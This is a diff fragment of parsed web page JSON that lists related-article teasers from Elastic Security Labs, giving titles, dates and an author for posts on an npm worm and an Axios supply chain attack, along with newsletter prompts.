+   "page": null,
+   "text": "Shai-Hulud strikes again: CHAINDROP worm hits 400+ npm packages",
+   "type": "heading",
+   "level": 3,
+   "section": "Shai-Hulud strikes again: CHAINDROP worm hits 400+ npm packages"
+  },
+  {
+   "id": "b228",
+   "page": null,
+   "text": "August 06, 2026",
+   "type": "paragraph",
+   "section": "Shai-Hulud strikes again: CHAINDROP worm hits 400+ npm packages"
+  },
+  {
+   "id": "b229",
+   "page": null,
+   "text": "Elastic Security Labs",
+   "type": "paragraph",
+   "section": "Shai-Hulud strikes again: CHAINDROP worm hits 400+ npm packages"
+  },
+  {
+   "id": "b230",
+   "page": null,
+   "text": "How we caught the Axios supply chain attack",
+   "type": "paragraph",
+   "section": "Shai-Hulud strikes again: CHAINDROP worm hits 400+ npm packages"
+  },
+  {
+   "id": "b231",
+   "page": null,
+   "text": "Threat Intelligence",
+   "type": "paragraph",
+   "section": "Shai-Hulud strikes again: CHAINDROP worm hits 400+ npm packages"
+  },
+  {
+   "id": "b232",
+   "page": null,
+   "text": "How we caught the Axios supply chain attack",
+   "type": "heading",
+   "level": 3,
+   "section": "How we caught the Axios supply chain attack"
+  },
+  {
+   "id": "b233",
+   "page": null,
+   "text": "April 02, 2026",
+   "type": "paragraph",
+   "section": "How we caught the Axios supply chain attack"
+  },
+  {
+   "id": "b234",
+   "page": null,
+   "text": "Joe Desimone",
+   "type": "paragraph",
+   "section": "How we caught the Axios supply chain attack"
+  },
+  {
+   "id": "b235",
+   "page": null,
+   "text": "Elastic Security Labs Newsletter",
+   "type": "heading",
+   "level": 3,
+   "section": "Elastic Security Labs Newsletter"
+  },
+  {
+   "id": "b236",
+   "page": null,
+   "text": "Follow Elastic Security Labs on",
+   "type": "paragraph",
+   "section": "Elastic Security Labs Newsletter"
+  }
+ ],
+ "language": "en"
+}
